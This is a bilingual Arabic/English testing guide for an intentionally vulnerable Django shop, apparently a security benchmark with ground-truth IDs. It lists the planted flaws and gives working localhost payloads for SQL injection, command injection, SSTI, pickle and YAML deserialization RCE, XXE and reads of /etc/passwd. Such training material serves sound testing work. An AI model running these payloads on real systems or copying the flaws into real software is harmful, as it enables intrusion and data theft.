# دليل الاختبار السريع | Quick Testing Guide

## البدء السريع | Quick Start

### 1. تشغيل السيرفر | Run Server
```bash
python manage.py runserver
```

### 2. اختبار الثغرات | Test Vulnerabilities
```bash
./test_vulnerabilities.sh
```

---

## قائمة الثغرات السريعة | Quick Vulnerabilities List

### 🔴 **Critical (14 ثغرة)**

| ID | الثغرة | الموقع |
|---|---|---|
| GT-01 | SQL Injection | `/accounts/api/users/search/?q=' OR '1'='1` |
| GT-02 | Insecure Deserialization | `/accounts/api/users/export/` |
| GT-06 | Broken Access Control | `/accounts/api/admin/action/` |
| GT-07 | SQL Injection | `/api/search/?q=' UNION SELECT` |
| GT-10 | Command Injection | `/api/report/?type=sales;id` |
| GT-12 | SSTI | `/api/render/?template={{settings.SECRET_KEY}}` |
| GT-13 | SQL Injection | `/orders/api/search/?order_number=' OR 1=1--` |
| GT-15 | YAML Deserialization | `/orders/api/import/yaml/` |
| GT-19 | SQL Injection | `/dashboard/api/search/` |
| GT-20 | Command Injection | `/dashboard/api/backup/` |
| GT-22 | Missing Auth | `/dashboard/api/bulk-delete/` |
| GT-23 | Info Disclosure | `/dashboard/api/system-info/` |
| GT-24 | Code Injection | `/dashboard/api/eval/?expr=` |
| GT-25 | SQL Injection | `/cart/api/discount/?code=' OR '1'='1` |
| GT-28 | Hardcoded Secret | `mystore/settings.py` |

### 🟠 **High (10 ثغرات)**

| ID | الثغرة | الموقع |
|---|---|---|
| GT-03 | Sensitive Data Exposure | `/accounts/api/users/debug/` |
| GT-04 | CSRF + IDOR | `/accounts/api/users/update-email/` |
| GT-09 | Path Traversal | `/api/image/?file=../../etc/passwd` |
| GT-14 | XXE Injection | `/orders/api/import/xml/` |
| GT-16 | IDOR | `/orders/api/invoice/<uuid>/` |
| GT-17 | Mass Assignment | `/orders/api/update-status/` |
| GT-18 | Info Disclosure | `/orders/api/export/` |
| GT-21 | Path Traversal | `/dashboard/api/logs/` |
| GT-29 | Debug Mode | `DEBUG=True in settings.py` |

### 🟡 **Medium (6 ثغرات)**

| ID | الثغرة | الموقع |
|---|---|---|
| GT-05 | Weak Crypto (MD5) | `/accounts/api/password/weak-reset/` |
| GT-08 | Reflected XSS | `/api/preview/?name=<script>` |
| GT-11 | Stored XSS | `/api/comment/` |
| GT-26 | CSRF | `/cart/api/update-ajax/` |
| GT-27 | IDOR | `/cart/api/details/` |
| GT-30 | Insecure Cookies | `settings.py` |

---

## أمثلة اختبار سريعة | Quick Test Examples

### SQL Injection
```bash
# GT-01
curl "http://localhost:8000/accounts/api/users/search/?q=' OR '1'='1"

# GT-07
curl "http://localhost:8000/api/search/?q=' UNION SELECT password FROM accounts_customuser--"

# GT-25
curl "http://localhost:8000/cart/api/discount/?code=' OR '1'='1"
```

### XSS
```bash
# GT-08 - Reflected XSS
curl "http://localhost:8000/api/preview/?name=<script>alert('XSS')</script>"

# GT-11 - Stored XSS
curl -X POST http://localhost:8000/api/comment/ \
  -H "Content-Type: application/json" \
  -d '{"product_id":"test","comment":"<script>alert(1)</script>"}'
```

### Command Injection
```bash
# GT-10
curl "http://localhost:8000/api/report/?type=sales;id"

# GT-20
curl "http://localhost:8000/dashboard/api/backup/?name=test;whoami"
```

### Path Traversal
```bash
# GT-09
curl "http://localhost:8000/api/image/?file=../../../etc/passwd"

# GT-21
curl "http://localhost:8000/dashboard/api/logs/?file=../../etc/passwd"
```

### SSTI
```bash
# GT-12
curl "http://localhost:8000/api/render/?template={{settings.SECRET_KEY}}"
curl "http://localhost:8000/api/render/?template={{7*7}}"
```

### Code Injection
```bash
# GT-24
curl "http://localhost:8000/dashboard/api/eval/?expr=1+1"
curl "http://localhost:8000/dashboard/api/eval/?expr=__import__('os').system('id')"
```

### IDOR
```bash
# GT-16 - Order Invoice
curl "http://localhost:8000/orders/api/invoice/ANY-UUID-HERE/"

# GT-27 - Cart Details
curl "http://localhost:8000/cart/api/details/?cart_id=ANY-UUID-HERE"
```

### Information Disclosure
```bash
# GT-03 - User Debug Info
curl "http://localhost:8000/accounts/api/users/debug/?id=USER-UUID"

# GT-23 - System Info (يكشف SECRET_KEY)
curl "http://localhost:8000/dashboard/api/system-info/"

# GT-18 - Export All Orders
curl "http://localhost:8000/orders/api/export/"
```

### Deserialization
```bash
# GT-02 - Pickle
python3 << 'EOF'
import pickle, base64, os
class RCE:
    def __reduce__(self):
        return (os.system, ('id',))
payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(f"curl 'http://localhost:8000/accounts/api/users/export/?data={payload}'")
EOF

# GT-15 - YAML
curl -X POST http://localhost:8000/orders/api/import/yaml/ \
  -d '!!python/object/apply:os.system ["id"]'
```

### XXE
```bash
# GT-14
curl -X POST http://localhost:8000/orders/api/import/xml/ \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<orders><order>&xxe;</order></orders>'
```

---

## أدوات الاختبار الموصى بها | Recommended Testing Tools

### SAST
```bash
# Bandit
pip install bandit
bandit -r . -f json -o bandit-report.json

# Semgrep
pip install semgrep
semgrep --config=auto --json -o semgrep-report.json .
```

### DAST
```bash
# OWASP ZAP
zap-cli quick-scan http://localhost:8000

# SQLMap
sqlmap -u "http://localhost:8000/accounts/api/users/search/?q=test" --batch
```

### Manual Testing
```bash
# Burp Suite
# Configure proxy to localhost:8080
# Start testing with Intruder and Scanner

# Postman
# Import collection and test API endpoints
```

---

## ملاحظات مهمة | Important Notes

⚠️ **تحذيرات:**
- لا تستخدم في الإنتاج
- اختبر في بيئة معزولة فقط
- احتفظ بنسخة احتياطية من قاعدة البيانات
- لا تعرض للإنترنت

✅ **للاختبار الآمن:**
- استخدم docker container معزول
- استخدم virtual machine
- استخدم localhost فقط

📚 **مراجع إضافية:**
- `VULNERABILITIES.md` - توثيق مفصل
- `data/ground_truth/ground_truth_v1.json` - قاعدة بيانات الثغرات
- `SECURITY.md` - سياسة الأمان

---

**آخر تحديث:** 2026-01-31
